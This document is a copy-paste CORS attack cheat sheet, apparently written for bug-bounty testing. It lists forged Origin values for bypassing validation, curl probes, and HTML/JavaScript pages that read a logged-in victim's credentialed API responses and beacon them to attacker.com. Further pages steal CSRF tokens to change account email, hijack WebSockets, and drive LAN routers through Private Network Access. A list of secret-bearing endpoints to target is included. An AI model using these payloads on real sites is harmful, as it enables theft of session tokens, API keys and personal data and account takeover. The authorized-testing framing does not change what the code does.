# CORS Arsenal — Origin Payloads, Bypass Strings & Exfil Snippets (copy-paste)

> Companion to `CORS_TESTING_GUIDE.md`. Everything here is for **authorized** testing with **your own** accounts.
> The win condition is always: an **attacker-controlled origin (or `null`) reflected into `Access-Control-Allow-Origin`
> with `Access-Control-Allow-Credentials: true`**, on a response that holds a **real secret**.

---

## 1. Origin values to fire (map the ACAO logic — Guide §5)

Send each as the `Origin:` request header; record the returned `Access-Control-Allow-Origin` + `Access-Control-Allow-Credentials`.

```
# Pure reflection (no validation)
Origin: https://evil.com
Origin: https://a1b2c3-random.example
Origin: https://attacker.test

# null origin (sandboxed iframe / data:/ redirects)
Origin: null

# Suffix / "endsWith target.com" weakness  (you register these)
Origin: https://nottarget.com
Origin: https://eviltarget.com
Origin: https://target.com.evil.com

# Prefix / "startsWith https://target.com" weakness
Origin: https://target.com.evil.com
Origin: https://target.com.evil.com:1337
Origin: https://target.com_evil.com

# "contains target.com"
Origin: https://target.com.evil.com
Origin: https://evil.com/?target.com
Origin: https://target-com.evil.com

# Unescaped-dot regex  (target\.com → '.' matches any char)
Origin: https://targetXcom              (where X is any allowed char)
Origin: https://targetacom.evil.com

# Trusted subdomain (need control of a sub — takeover/XSS, Guide §9)
Origin: https://sub.target.com
Origin: https://dev.target.com
Origin: https://staging.target.com

# Browser-vs-server parser confusion (test in a REAL browser too)
Origin: https://target.com%60.evil.com          (backtick)
Origin: https://target.com&.evil.com
Origin: https://target.com,evil.com
Origin: https://target.com%0a.evil.com
Origin: https://target.com..evil.com
Origin: https://target.com\.evil.com

# Scheme / port / case / trailing-dot normalization gaps
Origin: http://target.com                        (downgraded scheme accepted?)
Origin: https://target.com.                       (trailing dot)
Origin: https://TARGET.com                        (case)
Origin: https://target.com:443
Origin: https://target.com@evil.com               (userinfo)
```

---

## 2. Fast curl probes

```bash
T=https://api.target.com/api/me

# Reflection check
curl -s -D - -o /dev/null -H "Origin: https://evil.com" "$T" | grep -i 'access-control'

# null check
curl -s -D - -o /dev/null -H "Origin: null" "$T" | grep -i 'access-control'

# Suffix/prefix sweep
for o in https://nottarget.com https://target.com.evil.com https://eviltarget.com https://target.com%60.evil.com null; do
  echo "== $o =="
  curl -s -D - -o /dev/null -H "Origin: $o" "$T" | grep -i 'access-control-allow'
done

# Pre-flight (does OPTIONS widen methods/headers?)
curl -s -D - -o /dev/null -X OPTIONS \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: x-custom,authorization,content-type" "$T" | grep -i 'access-control'
```

What you want to see (vulnerable):
```
access-control-allow-origin: https://evil.com
access-control-allow-credentials: true
```

---

## 3. The credentialed-read exfil PoC (the actual exploit — Guide §11)

```html
<!-- attacker.com/exfil.html  — victim is logged into target.com in the same browser -->
<!DOCTYPE html><html><body>
<h1>loading…</h1>
<script>
const TARGET = 'https://api.target.com/api/me';     // secret-bearing, credentialed endpoint
const COLLECT = 'https://attacker.com/collect';      // YOUR collector (webhook.site works)
fetch(TARGET, { credentials: 'include' })            // include = send victim cookies
  .then(r => r.text())
  .then(d => {
    // benign PoC: ship to your own collector; redact in the public report
    navigator.sendBeacon(COLLECT, d);
    // or: fetch(COLLECT + '?d=' + encodeURIComponent(d));
  })
  .catch(e => navigator.sendBeacon(COLLECT, 'err:' + e));
</script>
</body></html>
```

XHR variant (older targets):
```html
<script>
var x = new XMLHttpRequest();
x.open('GET', 'https://api.target.com/api/me', true);
x.withCredentials = true;                            // = credentials:'include'
x.onload = function(){ new Image().src = 'https://attacker.com/collect?d=' + encodeURIComponent(x.responseText); };
x.send();
</script>
```

---

## 4. `null`-origin exploit via sandboxed iframe (Guide §7)

```html
<!-- attacker.com/null.html — the sandboxed iframe's document has Origin: null -->
<!DOCTYPE html><html><body>
<iframe style="display:none" sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
  &lt;script&gt;
    fetch('https://api.target.com/api/me', {credentials:'include'})
      .then(r=&gt;r.text())
      .then(d=&gt;{ parent.postMessage(d,'*'); });
  &lt;/script&gt;">
</iframe>
<script>
  window.addEventListener('message', e => {
    navigator.sendBeacon('https://attacker.com/collect', e.data);   // exfil to your collector
  });
</script>
</body></html>
```
> The sandboxed iframe (no `allow-same-origin`) runs with origin **`null`**. If the server reflects `Origin: null` + `ACAC:true`, this reads the victim's credentialed response.

---

## 5. CSRF-token theft → state change (Guide §13)

```html
<script>
// 1) steal the anti-CSRF token cross-origin
fetch('https://target.com/api/csrf', {credentials:'include'})
  .then(r => r.json())
  .then(t => {
    // 2) use it to perform the protected change (own account in PoC) → e.g. email takeover
    fetch('https://target.com/api/account/email', {
      method:'POST', credentials:'include',
      headers:{'Content-Type':'application/json','X-CSRF-Token': t.token},
      body: JSON.stringify({ email: 'attacker@evil.com' })
    });
  });
</script>
```

---

## 6. Bypass cheat — match the server rule to the origin

| Server validation (inferred) | Origin that defeats it |
|---|---|
| reflects any origin | `https://evil.com` (done — no bypass needed) |
| allows `null` | sandboxed-iframe `null` (§4) |
| `origin.endsWith("target.com")` | `https://nottarget.com`, `https://eviltarget.com` (register it) |
| `origin.startsWith("https://target.com")` | `https://target.com.evil.com` |
| `origin.includes("target.com")` | `https://target.com.evil.com`, `https://eviltarget.com` |
| regex `/target\.com/` (unescaped/loose) | `https://target.com.evil.com`, `https://targetXcom` |
| `*.target.com` only | subdomain takeover / XSS on a real sub (Guide §9) — can't forge from evil.com |
| exact-match allowlist (correct) | not bypassable by origin tricks — look for `null`, case, trailing-dot, or a hackable allowed origin |

---

## 7. Secret-bearing endpoints to point the exfil at (Guide §3)

```
/api/me            /api/user          /account           /profile           /settings
/api/keys          /api/tokens        /api/apikey        /oauth/token       /session
/api/csrf          /graphql           /api/v1/users/me   /me                /api/account
/api/billing       /api/messages      /api/notifications /api/2fa           /.well-known/...
```
Pick the one whose authenticated body holds a **token / API key / PII / CSRF token** (Guide §11/§12).

---

## 7b. Real-world CORS chains, regex-bypass examples & references (guide §8/§9/§14)
```
# common server regex flaws → the attacker origin that defeats each (register/host these):
^https?://.*\.target\.com$        → https://evil.target.com.attacker.com  (if not anchored to a real sub) ; subdomain takeover
contains("target.com")            → https://target.com.attacker.com  ·  https://attacker.com/target.com (path)  ·  https://targetXcom (unescaped dot)
startsWith("https://target.com")  → https://target.com.attacker.com  ·  https://target.com.attacker.com:1337
endsWith("target.com")            → https://nottarget.com  ·  https://eviltarget.com
"null" allowed                    → sandboxed iframe (Origin: null), §4
# real-world high-impact chains:
□ ACAO reflects origin + ACAC:true on /api/me|/account|/graphql → read session token/API key → ACCOUNT TAKEOVER.
□ ACAO trusts *.target.com only → subdomain takeover or XSS on a sub → host exfil there → credentialed theft (guide §9).
□ CORS-readable anti-CSRF token → steal it → CSRF the protected action (email/pw change) → ATO (§5; CSRF kit).
□ CORS-leaked CLOUD/admin/CI secret → cloud run-command / admin code-exec / pipeline → RCE/shell (guide §14.1).
□ ACAO:* on a sensitive, NO-AUTH internal/pre-prod API → cross-origin data theft even without credentials.
□ Dynamic reflection that also trusts http:// → MITM/downgrade angle on mixed deployments.
# NOT exploitable (don't over-report): ACAO:* + ACAC:true together (browsers ignore for creds); static correct ACAO.
```
> **References:** PortSwigger *CORS* (Web Security Academy + labs), PayloadsAllTheThings *CORS Misconfiguration*,
> HackTricks *CORS bypass*, James Kettle / Jordan Milne CORS research, MDN CORS, Hackviser & PentesterLab CORS modules,
> `s0md3v/Corsy` & `chenjj/CORScanner`.

---

## 7c. Pre-flight testing & custom-header / write exploitation (Guide §10.2 / §13.2)
```bash
T=https://api.target.com/api/account
# does the preflight permit custom headers + write methods for my origin?
curl -s -D - -o /dev/null -X OPTIONS "$T" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: authorization,x-api-key,content-type" | grep -i 'access-control'
# vulnerable preflight response:
#   access-control-allow-origin: https://evil.com
#   access-control-allow-credentials: true
#   access-control-allow-methods: GET, POST, PUT, DELETE     (or *)
#   access-control-allow-headers: authorization, x-api-key, content-type   (or *)
#   access-control-expose-headers: x-secret-token            (lets JS READ that response header)
```
```html
<!-- credentialed JSON WRITE + read result (needs permissive preflight) -->
<script>
fetch('https://api.target.com/api/account',{method:'PUT',credentials:'include',
  headers:{'Content-Type':'application/json'},          // JSON => preflighted
  body:JSON.stringify({email:'attacker@evil.tld'})})    // own account in PoC -> ATO
 .then(r=>r.text()).then(d=>navigator.sendBeacon('https://attacker.com/collect',d));
</script>
<!-- credentialed read of a CUSTOM-HEADER-gated endpoint (needs ACAH to allow the header) -->
<script>
fetch('https://api.target.com/api/keys',{credentials:'include',headers:{'X-Api-Key':'...'}})
 .then(r=>r.text()).then(d=>navigator.sendBeacon('https://attacker.com/collect',d));
</script>
<!-- read a SECRET in a RESPONSE HEADER (only works if Access-Control-Expose-Headers lists it) -->
<script>fetch('https://api.target.com/me',{credentials:'include'})
 .then(r=>navigator.sendBeacon('https://attacker.com/collect', r.headers.get('X-Secret-Token')));</script>
```
> Simple credentialed **GET** of a returned JSON body needs **no** preflight; you only need a permissive preflight for custom-header reads, JSON/PUT/DELETE writes, or reading secret **response headers** (Expose-Headers).

## 7d. CORS response cache poisoning probe (missing `Vary: Origin`) (Guide §10.4)
```bash
T=https://target.com/api/config
# 1) inject origin, check it's reflected AND cacheable AND no Vary: Origin:
curl -s -D - -o /dev/null -H "Origin: https://evil.com" "$T" | grep -iE 'access-control-allow-origin|age|x-cache|cache-control|vary'
# 2) clean follow-up (no Origin header) on the SAME url — is the reflected evil.com ACAO served from cache?
curl -s -D - -o /dev/null "$T" | grep -i 'access-control-allow-origin'
# POISONED if step 2 returns  access-control-allow-origin: https://evil.com  (with Age/X-Cache:hit, no Vary: Origin).
# (Prove on a benign/unique cache key; Param Miner confirms the header is unkeyed — Host-Header kit §12.)
```

## 7e. Cross-Site WebSocket Hijacking (CSWSH) — WS ignores CORS/SOP (Guide §13.3)
```bash
# test: replay the WS handshake with a foreign Origin — does the authenticated upgrade still succeed?
#   (Burp Repeater WS, or wscat with a forged Origin header). 101 Switching Protocols + works authed = CSWSH.
```
```html
<!-- attacker page; victim logged into target.com — the handshake carries victim cookies, NO CORS gate -->
<script>
const ws = new WebSocket('wss://target.com/chat');           // or ws:// for plaintext
ws.onopen    = () => ws.send('{"action":"getMessages"}');     // act as the victim
ws.onmessage = e  => navigator.sendBeacon('https://attacker.com/exfil', e.data);  // read victim's stream
</script>
```
> Vulnerable when the WS endpoint is **cookie-authenticated** and the handshake **doesn't validate `Origin`**. Fix = validate Origin on the handshake + per-connection CSRF token.

## 7f. Private Network Access (PNA) — public page → intranet/localhost (Guide §10.5)
```bash
# does the internal device grant PNA? (preflight carries Access-Control-Request-Private-Network: true)
curl -s -i 'http://192.168.1.1/' -X OPTIONS \
  -H 'Origin: https://evil.com' \
  -H 'Access-Control-Request-Method: GET' \
  -H 'Access-Control-Request-Private-Network: true'
# EXPLOITABLE if the response includes:  Access-Control-Allow-Private-Network: true  (+ ACAO reflecting/`*` [+ ACAC:true])
```
```html
<!-- attacker page; victim on their LAN — drive their router/IoT/localhost dev service cross-origin -->
<script>
fetch('http://192.168.1.1/set?admin=1', {credentials:'include'})        // public→private; needs PNA grant
  .then(r=>r.text()).then(d=>navigator.sendBeacon('https://attacker.com/exfil', d));
// localhost dev/admin server variant: fetch('http://127.0.0.1:8080/...', {credentials:'include'})
</script>
```
> Targets: routers / printers / IoT / `127.0.0.1` dev-admin servers that answer `Access-Control-Allow-Private-Network: true`.
> If PNA is NOT granted but you still need internal reach → pivot to **DNS rebinding** (SSRF kit §7.2).

## 8. Quick triage rules (don't waste a report)

```
ACAO reflects evil.com  +  ACAC:true  +  secret in body   → REPORT (High; Critical if token→ATO or secret→RCE)
ACAO: null              +  ACAC:true  +  secret in body   → REPORT (High)
ACAO reflects evil.com  +  NO ACAC                         → only if body is sensitive & auth-less → else Info
ACAO: *                 +  NO ACAC                         → only if sensitive no-auth data → else Info
ACAO: *                 +  ACAC:true                       → browser ignores for creds → NOT exploitable (hardening note)
ACAO static/correct                                        → not a bug unless you control that origin
proven only with curl (no browser read / no creds)        → NOT proven — build the fetch() PoC first
```
